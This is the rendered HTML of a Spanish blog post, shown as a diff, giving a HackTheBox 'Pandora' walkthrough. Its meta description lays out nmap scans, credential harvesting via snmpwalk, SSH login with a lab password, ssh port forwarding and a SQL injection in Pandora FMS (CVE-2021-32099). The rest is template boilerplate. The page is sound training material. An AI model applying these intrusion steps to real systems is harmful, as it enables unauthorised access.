@@ -1,0 +1,6172 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html lang="en"
+  
+>
+
+  <!--
+  The Head
+-->
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <!-- Allow having a localized datetime different from the appearance language -->
+  
+
+  
+
+    
+
+    
+
+  
+
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v4.2.1" />
+<meta property="og:title" content="Pandora HackTheBox" />
+<meta property="og:locale" content="en" />
+<meta name="description" content="Bienvenidos/a Este artículo tratará la resolución de la máquina Pandora de la plataforma de Ciberseguridad HackTheBox. Información sobre la máquina Bueno, esta máquina tiene una dificultad fácil, pero digo desde ya que no es una máquina fácil, ja, ja. Muy divertida y aprendí bastantes cosas en su momento. Sin duda mi máquina favorita &lt;3. Matrix SQLI (Sql Injection) SNMP (Protocolo simple de administración de red) UDP Path Hijacking CVE-2021-32099 Local Port Forwarding Reconocimiento Nmap (TCP-UDP) 1 2 3 nmap -sSU --min-rate 12000 -Pn -n -p- --open -v 10.10.11.136 nmap -sS -sCV -n -p 22,80 -T5 -Pn -n -v 10.10.11.136 nmap -sU -sCV -n -p 161 -T5 -Pn -v 10.10.11.136 Procedemos a buscar exploits públicos que afecten a las versiones de estos servicios, pero no encontramos nada interesante. Servidor Web Demos un vistazo a lo que almacena el servidor web. Pues al parecer el servidor web almacena un sitio web estático y poco podríamos hacer, pero conseguimos un dominio. Procedemos a agregar el dominio. 1 vim /etc/hosts Ya estaría haciendo la resolución DNS, podríamos buscar subdominios, pero los tiros no van por ahí. SNMP Ahora nos queda el SNMP. Buscando un poco encontramos bastante información (dejaré los recursos al final) vamos a emplear la herramienta snmpwalk. Al ejecutar la herramienta nos da información bastante útil como la versión del Kernel Linux y un posible usuario (Daniel). Incluso podemos ver procesos que se están ejecutando. Luego de esperar un poco encontramos unas credenciales (yo envíe la salida del comando a un fichero para luego filtrar). 1 snmpwalk -v 2c -c public 10.10.11.136 &gt; snmp Intrusión SSH Vamos a verificar que las credenciales obtenidas anteriormente sean válidas. 1 ssh daniel@panda.htb /* HotelBabylon23 */ Estamos dentro ;). Ahora a enumerar un poco el sistema. Vemos que hay otro usuario llamado Matt. Al ingresar al directorio del usuario Matt vemos que está el flag, pero lamentablemente no tenemos permisos de lectura ni escritura. Al listar el directorio /var/www/ vemos que está el sitio web estático y hay una aplicación web que no tenemos acceso. También está corriendo el servicio MySQL. Podemos saber esto de dos formas viendo que servicios están en escucha y ver si el demonio de MySQL está corriendo. 1 2 netstat -lt /* -l:escuha y -t:TCP */ systemctl status mysql Entonces con esta información recopilada estamos seguro de que los tiros van con la aplicación web. Local Port Forwarding Para poder acceder a la aplicación web vamos a emplear una técnica de pivoting que se conoce como Local port forwarding. No es más que traer los servicios que corren en los diferentes puertos de la máquina objetiva a nuestra máquina y así poder acceder a ellos, ya que esos servicios son internos y no están expuestos. 1 ssh -L 1313:localhost:80 daniel@panda.htb /* :tu_puerto:localhost:puerto-de-la-máquina host-remoto */ Explotación Bueno, ya tendríamos acceso a la aplicación web, toca buscar algún CVE que afecte a la versión de Pandora FMS. Luego de buscar hay varios CVEs que afectan, pero ninguno funcional, ya que la versión está con parches. Busquemos “pandora v7 742 CVE”. Nos encontramos un blog bastante suculento que explica a detalle las diferentes vulnerabilidades que afectan a esa versión de Pandora FMS. Lo que más llama la atención es la SQLI a buscar por el CVE si hay algún tipo de exploit, pero ya con leer un poco el blog (o buscar información en otra parte acerca de la vulnerabilidad) ya podríamos explotar nosotros la vulnerabilidad. El fichero chart_generator.php contiene el parámetro vulnerable session_id." />
+<meta property="og:description" content="Bienvenidos/a Este artículo tratará la resolución de la máquina Pandora de la plataforma de Ciberseguridad HackTheBox. Información sobre la máquina Bueno, esta máquina tiene una dificultad fácil, pero digo desde ya que no es una máquina fácil, ja, ja. Muy divertida y aprendí bastantes cosas en su momento. Sin duda mi máquina favorita &lt;3. Matrix SQLI (Sql Injection) SNMP (Protocolo simple de administración de red) UDP Path Hijacking CVE-2021-32099 Local Port Forwarding Reconocimiento Nmap (TCP-UDP) 1 2 3 nmap -sSU --min-rate 12000 -Pn -n -p- --open -v 10.10.11.136 nmap -sS -sCV -n -p 22,80 -T5 -Pn -n -v 10.10.11.136 nmap -sU -sCV -n -p 161 -T5 -Pn -v 10.10.11.136 Procedemos a buscar exploits públicos que afecten a las versiones de estos servicios, pero no encontramos nada interesante. Servidor Web Demos un vistazo a lo que almacena el servidor web. Pues al parecer el servidor web almacena un sitio web estático y poco podríamos hacer, pero conseguimos un dominio. Procedemos a agregar el dominio. 1 vim /etc/hosts Ya estaría haciendo la resolución DNS, podríamos buscar subdominios, pero los tiros no van por ahí. SNMP Ahora nos queda el SNMP. Buscando un poco encontramos bastante información (dejaré los recursos al final) vamos a emplear la herramienta snmpwalk. Al ejecutar la herramienta nos da información bastante útil como la versión del Kernel Linux y un posible usuario (Daniel). Incluso podemos ver procesos que se están ejecutando. Luego de esperar un poco encontramos unas credenciales (yo envíe la salida del comando a un fichero para luego filtrar). 1 snmpwalk -v 2c -c public 10.10.11.136 &gt; snmp Intrusión SSH Vamos a verificar que las credenciales obtenidas anteriormente sean válidas. 1 ssh daniel@panda.htb /* HotelBabylon23 */ Estamos dentro ;). Ahora a enumerar un poco el sistema. Vemos que hay otro usuario llamado Matt. Al ingresar al directorio del usuario Matt vemos que está el flag, pero lamentablemente no tenemos permisos de lectura ni escritura. Al listar el directorio /var/www/ vemos que está el sitio web estático y hay una aplicación web que no tenemos acceso. También está corriendo el servicio MySQL. Podemos saber esto de dos formas viendo que servicios están en escucha y ver si el demonio de MySQL está corriendo. 1 2 netstat -lt /* -l:escuha y -t:TCP */ systemctl status mysql Entonces con esta información recopilada estamos seguro de que los tiros van con la aplicación web. Local Port Forwarding Para poder acceder a la aplicación web vamos a emplear una técnica de pivoting que se conoce como Local port forwarding. No es más que traer los servicios que corren en los diferentes puertos de la máquina objetiva a nuestra máquina y así poder acceder a ellos, ya que esos servicios son internos y no están expuestos. 1 ssh -L 1313:localhost:80 daniel@panda.htb /* :tu_puerto:localhost:puerto-de-la-máquina host-remoto */ Explotación Bueno, ya tendríamos acceso a la aplicación web, toca buscar algún CVE que afecte a la versión de Pandora FMS. Luego de buscar hay varios CVEs que afectan, pero ninguno funcional, ya que la versión está con parches. Busquemos “pandora v7 742 CVE”. Nos encontramos un blog bastante suculento que explica a detalle las diferentes vulnerabilidades que afectan a esa versión de Pandora FMS. Lo que más llama la atención es la SQLI a buscar por el CVE si hay algún tipo de exploit, pero ya con leer un poco el blog (o buscar información en otra parte acerca de la vulnerabilidad) ya podríamos explotar nosotros la vulnerabilidad. El fichero chart_generator.php contiene el parámetro vulnerable session_id." />
+<link rel="canonical" href="/posts/pandora-hackthebox/" />
+<meta property="og:url" content="/posts/pandora-hackthebox/" />
+<meta property="og:site_name" content="T3sla" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-05-18T19:51:00-04:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Pandora HackTheBox" />
+<meta name="twitter:site" content="@T3_6_9" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-05-18T19:51:00-04:00","datePublished":"2022-05-18T19:51:00-04:00","description":"Bienvenidos/a Este artículo tratará la resolución de la máquina Pandora de la plataforma de Ciberseguridad HackTheBox. Información sobre la máquina Bueno, esta máquina tiene una dificultad fácil, pero digo desde ya que no es una máquina fácil, ja, ja. Muy divertida y aprendí bastantes cosas en su momento. Sin duda mi máquina favorita &lt;3. Matrix SQLI (Sql Injection) SNMP (Protocolo simple de administración de red) UDP Path Hijacking CVE-2021-32099 Local Port Forwarding Reconocimiento Nmap (TCP-UDP) 1 2 3 nmap -sSU --min-rate 12000 -Pn -n -p- --open -v 10.10.11.136 nmap -sS -sCV -n -p 22,80 -T5 -Pn -n -v 10.10.11.136 nmap -sU -sCV -n -p 161 -T5 -Pn -v 10.10.11.136 Procedemos a buscar exploits públicos que afecten a las versiones de estos servicios, pero no encontramos nada interesante. Servidor Web Demos un vistazo a lo que almacena el servidor web. Pues al parecer el servidor web almacena un sitio web estático y poco podríamos hacer, pero conseguimos un dominio. Procedemos a agregar el dominio. 1 vim /etc/hosts Ya estaría haciendo la resolución DNS, podríamos buscar subdominios, pero los tiros no van por ahí. SNMP Ahora nos queda el SNMP. Buscando un poco encontramos bastante información (dejaré los recursos al final) vamos a emplear la herramienta snmpwalk. Al ejecutar la herramienta nos da información bastante útil como la versión del Kernel Linux y un posible usuario (Daniel). Incluso podemos ver procesos que se están ejecutando. Luego de esperar un poco encontramos unas credenciales (yo envíe la salida del comando a un fichero para luego filtrar). 1 snmpwalk -v 2c -c public 10.10.11.136 &gt; snmp Intrusión SSH Vamos a verificar que las credenciales obtenidas anteriormente sean válidas. 1 ssh daniel@panda.htb /* HotelBabylon23 */ Estamos dentro ;). Ahora a enumerar un poco el sistema. Vemos que hay otro usuario llamado Matt. Al ingresar al directorio del usuario Matt vemos que está el flag, pero lamentablemente no tenemos permisos de lectura ni escritura. Al listar el directorio /var/www/ vemos que está el sitio web estático y hay una aplicación web que no tenemos acceso. También está corriendo el servicio MySQL. Podemos saber esto de dos formas viendo que servicios están en escucha y ver si el demonio de MySQL está corriendo. 1 2 netstat -lt /* -l:escuha y -t:TCP */ systemctl status mysql Entonces con esta información recopilada estamos seguro de que los tiros van con la aplicación web. Local Port Forwarding Para poder acceder a la aplicación web vamos a emplear una técnica de pivoting que se conoce como Local port forwarding. No es más que traer los servicios que corren en los diferentes puertos de la máquina objetiva a nuestra máquina y así poder acceder a ellos, ya que esos servicios son internos y no están expuestos. 1 ssh -L 1313:localhost:80 daniel@panda.htb /* :tu_puerto:localhost:puerto-de-la-máquina host-remoto */ Explotación Bueno, ya tendríamos acceso a la aplicación web, toca buscar algún CVE que afecte a la versión de Pandora FMS. Luego de buscar hay varios CVEs que afectan, pero ninguno funcional, ya que la versión está con parches. Busquemos “pandora v7 742 CVE”. Nos encontramos un blog bastante suculento que explica a detalle las diferentes vulnerabilidades que afectan a esa versión de Pandora FMS. Lo que más llama la atención es la SQLI a buscar por el CVE si hay algún tipo de exploit, pero ya con leer un poco el blog (o buscar información en otra parte acerca de la vulnerabilidad) ya podríamos explotar nosotros la vulnerabilidad. El fichero chart_generator.php contiene el parámetro vulnerable session_id.","headline":"Pandora HackTheBox","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/pandora-hackthebox/"},"url":"/posts/pandora-hackthebox/"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+  <title>Pandora HackTheBox | T3sla
+  </title>
+
+  <!--
+  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
+  Generated by: https://realfavicongenerator.net/
+-->
+
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
+<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
+<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
+<meta name="apple-mobile-web-app-title" content="T3sla">
+<meta name="application-name" content="T3sla">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
+<meta name="theme-color" content="#ffffff">
+
+
+  
+
+    
+      <link rel="preconnect" href="https://fonts.googleapis.com" >
+      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
+    
+      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
+    
+      <link rel="preconnect" href="https://fonts.googleapis.com" >
+      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
+    
+      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
+      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
+    
+
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
+
+  
+
+  <!-- GA -->
+  
+
+  <!-- Bootstrap -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css">
+
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">
+
+  <link rel="stylesheet" href="/assets/css/style.css">
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">
+  
+
+  
+    <!-- Manific Popup -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css">
+  
+
+  <!-- JavaScript -->
+
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+
+</head>
+
+
+  
+    <!--
+  Switch the mode between dark and light.
+-->
+
+<script type="text/javascript">
+  class ModeToggle {
+    static get MODE_KEY() { return "mode"; }
+    static get MODE_ATTR() { return "data-mode"; }
+    static get DARK_MODE() { return "dark"; }
+    static get LIGHT_MODE() { return "light"; }
+    static get ID() { return "mode-toggle"; }
+
+    constructor() {
+      if (this.hasMode) {
+        if (this.isDarkMode) {
+          if (!this.isSysDarkPrefer) {
+            this.setDark();
+          }
+        } else {
+          if (this.isSysDarkPrefer) {
+            this.setLight();
+          }
+        }
+      }
+
+      let self = this;
+
+      /* always follow the system prefers */
+      this.sysDarkPrefers.addEventListener("change", () => {
+        if (self.hasMode) {
+          if (self.isDarkMode) {
+            if (!self.isSysDarkPrefer) {
+              self.setDark();
+            }
+
+          } else {
+            if (self.isSysDarkPrefer) {
+              self.setLight();
+            }
+          }
+
+          self.clearMode();
+        }
+
+        self.notify();
+
+      });
+
+    } /* constructor() */
+
+    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }
+
+    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }
+
+    get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; }
+
+    get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; }
+
+    get hasMode() { return this.mode != null; }
+
+    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }
+
+    /* get the current mode on screen */
+    get modeStatus() {
+      if (this.isDarkMode
+        || (!this.hasMode && this.isSysDarkPrefer)) {
+        return ModeToggle.DARK_MODE;
+      } else {
+        return ModeToggle.LIGHT_MODE;
+      }
+    }
+
+    setDark() {
+      $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE);
+      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
+    }
+
+    setLight() {
+      $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE);
+      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
+    }
+
+    clearMode() {
+      $('html').removeAttr(ModeToggle.MODE_ATTR);
+      sessionStorage.removeItem(ModeToggle.MODE_KEY);
+    }
+
+    /* Notify another plugins that the theme mode has changed */
+    notify() {
+      window.postMessage({
+        direction: ModeToggle.ID,
+        message: this.modeStatus
+      }, "*");
+    }
+
+  } /* ModeToggle */
+
+  const toggle = new ModeToggle();
+
+  function flipMode() {
+    if (toggle.hasMode) {
+      if (toggle.isSysDarkPrefer) {
+        if (toggle.isLightMode) {
+          toggle.clearMode();
+        } else {
+          toggle.setLight();
+        }
+
+      } else {
+        if (toggle.isDarkMode) {
+          toggle.clearMode();
+        } else {
+          toggle.setDark();
+        }
+      }
+
+    } else {
+      if (toggle.isSysDarkPrefer) {
+        toggle.setLight();
+      } else {
+        toggle.setDark();
+      }
+    }
+
+    toggle.notify();
+
+  } /* flipMode() */
+
+</script>
+
+  
+
+  <body data-spy="scroll" data-target="#toc" data-topbar-visible="true">
+
+    <!--
+  The Side Bar
+-->
+
+<div id="sidebar" class="d-flex flex-column align-items-end">
+  <div class="profile-wrapper text-center">
+    <div id="avatar">
+      <a href="/" alt="avatar" class="mx-auto">
+        
+          
+          <img src="
+            
+              /commons/avatar.jpg
+            
+          " alt="avatar" onerror="this.style.display='none'">
+        
+      </a>
+    </div>
+
+    <div class="site-title mt-3">
+      <a href="/">T3sla</a>
+    </div>
+    <div class="site-subtitle font-italic">Cybersecurity enthusiast, Low-level enthusiast.</div>
+
+  </div><!-- .profile-wrapper -->
+
+  <ul class="w-100">
+
+    <!-- home -->
+    <li class="nav-item">
+      <a href="/" class="nav-link">
+        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
+        <span>HOME</span>
+      </a>
+    </li>
+    <!-- the real tabs -->
+    
+    <li class="nav-item">
+      <a href="/categories/" class="nav-link">
+        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
+        
+
+        <span>CATEGORIES</span>
+      </a>
+    </li> <!-- .nav-item -->
+    
+    <li class="nav-item">
+      <a href="/tags/" class="nav-link">
+        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
+        
+
+        <span>TAGS</span>
+      </a>
+    </li> <!-- .nav-item -->
+    
+    <li class="nav-item">
+      <a href="/archives/" class="nav-link">
+        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
+        
+
+        <span>ARCHIVES</span>
+      </a>
+    </li> <!-- .nav-item -->
+    
+    <li class="nav-item">
+      <a href="/about/" class="nav-link">
+        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
+        
+
+        <span>ABOUT</span>
+      </a>
+    </li> <!-- .nav-item -->
+    
+
+  </ul> <!-- ul.nav.flex-column -->
+
+  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">
+
+    
+      <button class="mode-toggle btn" aria-label="Switch Mode">
+        <i class="fas fa-adjust"></i>
+      </button>
+
+      
+        <span class="icon-border"></span>
+      
+    
+
+    
+      
+
+      
+      <a href="https://github.com/T369-Real" aria-label="github"
+        target="_blank" rel="noopener">
+        <i class="fab fa-github"></i>
+      </a>
+      
+
+    
+      
+
+      
+      <a href="https://twitter.com/T3_6_9" aria-label="twitter"
+        target="_blank" rel="noopener">
+        <i class="fab fa-twitter"></i>
+      </a>
+      
+
+    
+      
+
+      
+      <a href="https://instagram.com/T3_6_9" aria-label="Instagram"
+        target="_blank" rel="noopener">
+        <i class="fab fa-instagram"></i>
+      </a>
+      
+
+    
+      
+
+      
+      <a href="https://www.youtube.com/channel/UCuo2A2MsIeQ0g0ZKBG5MRgQ" aria-label="YouTube"
+        target="_blank" rel="noopener">
+        <i class="fab fa-youtube"></i>
+      </a>
+      
+
+    
+
+  </div> <!-- .sidebar-bottom -->
+
+</div><!-- #sidebar -->
+
+
+    <!--
+  The Top Bar
+-->
+
+<div id="topbar-wrapper" class="row justify-content-center">
+  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
+    <span id="breadcrumb">
+
+    
+
+    
+
+      
+
+        
+          <span>
+            <a href="/">
+              Home
+            </a>
+          </span>
+
+        
+
+      
+
+        
+
+      
+
+        
+
+          
+            <span>Pandora HackTheBox</span>
+          
+
+        
+
+      
+
+    
+
+    </span><!-- endof #breadcrumb -->
+
+    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>
+
+    <div id="topbar-title">
+      Post
+    </div>
+
+    <i id="search-trigger" class="fas fa-search fa-fw"></i>
+    <span id="search-wrapper" class="align-items-center">
+      <i class="fas fa-search fa-fw"></i>
+      <input class="form-control" id="search-input" type="search"
+        aria-label="search" autocomplete="off" placeholder="Search...">
+    </span>
+    <span id="search-cancel" >Cancel</span>
+  </div>
+
+</div>
+
+
+    <div id="main-wrapper">
+      <div id="main">
+
+        
+
+
+
+
+
+
+
+
+
+<div class="row">
+
+  <!-- core -->
+  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-8">
+    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
+
+    
+
+    
+      
+      
+        <!--
+  Refactor the HTML structure.
+-->
+
+
+
+<!--
+  In order to allow a wide table to scroll horizontally,
+  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
+-->
+
+
+
+<!--
+  Fixed kramdown code highlight rendering:
+  https://github.com/penibelst/jekyll-compress-html/issues/101
+  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
+-->
+
+
+
+<!-- Add attribute 'hide-bullet' to the checkbox list -->
+
+
+
+<!-- images -->
+
+
+
+
+  
+  
+
+  
+    
+      
+      
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
